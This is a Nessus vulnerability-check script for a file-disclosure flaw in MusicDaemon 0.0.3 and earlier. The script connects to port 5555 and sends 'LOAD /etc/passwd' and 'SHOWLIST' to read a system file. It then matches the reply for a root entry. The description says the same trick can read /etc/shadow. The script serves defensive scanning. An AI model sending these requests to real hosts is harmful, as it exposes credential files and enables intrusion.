#
# This script was written by Noam Rathaus
#
# See the Nessus Scripts License for details
#
# From: "cyber talon" <cyber_talon@hotmail.com>
# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
# Date: 23.8.2004 17:36

if(description)
{
 script_id(14354);  
 script_cve_id("CAN-2004-1740");
 script_bugtraq_id(11006);
 script_version ("$Revision: 1.4 $");

 name["english"] = "Music Daemon File Disclosure";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running MusicDaemon, a music player running as a server.

It is possible to cause the Music Daemon to disclose the
content of arbitrary files by inserting them to the list 
of tracks to listen to.

An attacker can list the content of arbitrary files including the 
/etc/shadow file, as by default the daemon runs under root privileges.

Solution : None at this time
Risk Factor: High";
 script_description(english:desc["english"]);
 
 summary["english"] = "Music Daemon File Disclosure";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/musicdaemon", 5555);
 exit(0);
}

include('global_settings.inc');

port = get_kb_item("Services/musicdaemon");
if ( thorough_tests && ! port ) port = 5555;
if ( port == 0 ) exit(0);

if ( ! get_port_state(port) ) exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

recv = recv_line(socket:soc, length: 1024);

if ("Hello" >< recv)
{
 data = string("LOAD /etc/passwd\r\n");
 send(socket:soc, data: data);

 data = string("SHOWLIST\r\n");
 send(socket:soc, data: data);

 recv = recv(socket:soc, length: 1024);
 close(soc);
 if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:recv) ) security_hole(port:port);
}
